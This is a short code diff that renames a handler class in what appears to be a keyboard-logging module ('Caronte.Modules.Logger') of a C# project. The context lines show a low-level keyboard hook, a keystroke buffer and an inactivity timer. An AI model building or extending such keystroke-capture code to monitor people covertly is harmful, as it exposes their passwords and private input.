@@ -14,7 +14,7 @@ using System.Windows.Forms;
 
 namespace Caronte.Modules.Logger
 {
-    public class LogQueryHandler : IRequestHandler<LogQuery>
+    public class GetKeyboardLogQueryHandler : IRequestHandler<GetKeyboardLogQuery>
     {
         private StringBuilder buffer;
         private readonly string desktopPath;
@@ -43,7 +43,7 @@ namespace Caronte.Modules.Logger
 
         private LowLevelKeyboardProc _proc;
 
-        public LogQueryHandler()
+        public GetKeyboardLogQueryHandler()
         {
             inactivityTimer = new System.Timers.Timer(3000);
             inactivityTimer.Elapsed += OnInactivityTimerElapsed;
@@ -51,7 +51,7 @@ namespace Caronte.Modules.Logger
             buffer = new StringBuilder();
         }
 
-        public Task<Unit> Handle(LogQuery request, CancellationToken cancellationToken)
+        public Task<Unit> Handle(GetKeyboardLogQuery request, CancellationToken cancellationToken)
         {
             _proc = HookCallback;
             hookId = SetHook(_proc);
